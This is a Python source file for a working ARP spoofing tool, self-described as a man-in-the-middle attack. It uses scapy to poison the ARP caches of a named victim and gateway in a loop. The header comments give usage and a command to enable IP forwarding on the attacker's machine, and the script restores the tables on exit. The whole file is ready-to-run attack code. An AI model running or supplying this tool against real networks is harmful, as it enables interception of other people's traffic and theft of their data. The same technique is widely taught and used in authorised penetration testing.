#!usr/bin/env python3

import argparse
import sys
import ipaddress
import scapy.all as scapy
import time

# Functionality like arpspoof tool
# On the attacker machine, enables IP forwarding by running from command line $echo 1 > /proc/sys/net/ipv4/ip_forward
# python3 arpSpoofer.py -v 10.1.1.4 -g 10.1.1.1

def get_arguments():
    """
    Parses command-line arguments and validates IP addresses.
    """
    parser = argparse.ArgumentParser(description="ARP Spoofer (Man-in-the-Middle Attack)")
    parser.add_argument("-v", "--victim", required=True, help="Victim IP address")
    parser.add_argument("-g", "--gateway", required=True, help="Router/Gateway IP address")
    args = parser.parse_args()

    # Validate IP addresses
    for ip in [args.victim, args.gateway]:
        if not validate_ip(ip):
            print(f"[ERROR] Invalid IP address: {ip}")
            sys.exit(1)

    return args


def validate_ip(ip):
    """
    Validates an IP address format.
    """
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False


def get_mac(ip):
    """
    Retrieves the MAC address for a given IP.
    """
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

        if answered_list:
            return answered_list[0][1].hwsrc
        else:
            print(f"[ERROR] No response for IP {ip}. Ensure the target is online.")
            sys.exit(1)
    except Exception as e:
        print(f"[ERROR] Failed to retrieve MAC address: {e}")
        sys.exit(1)


def spoof(target_ip, spoof_ip):
    """
    Sends an ARP reply to poison the target's ARP cache.
    """
    try:
        target_mac = get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)
    except Exception as e:
        print(f"[ERROR] Failed to send spoofed packet: {e}")


def restore(destination_ip, source_ip):
    """
    Restores ARP tables by sending correct MAC addresses.
    """
    try:
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)
        print(f"[INFO] Restored ARP table for {destination_ip}")
    except Exception as e:
        print(f"[ERROR] Failed to restore ARP table: {e}")


if __name__ == "__main__":
    args = get_arguments()
    target_ip = args.victim # victim 10.1.1.4
    gateway_ip = args.gateway # router 10.1.1.1

    print(f"[INFO] Starting ARP spoofing between Victim: {target_ip} and Gateway: {gateway_ip}")
    sent_packets_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print(f"\r[INFO] Packets sent: {sent_packets_count}", end="", flush=True)
            time.sleep(2) #sleep for 2 seconds
    except KeyboardInterrupt:
        print("\n[INFO] Detected CTRL+C. Restoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[INFO] ARP tables restored. Exiting.")
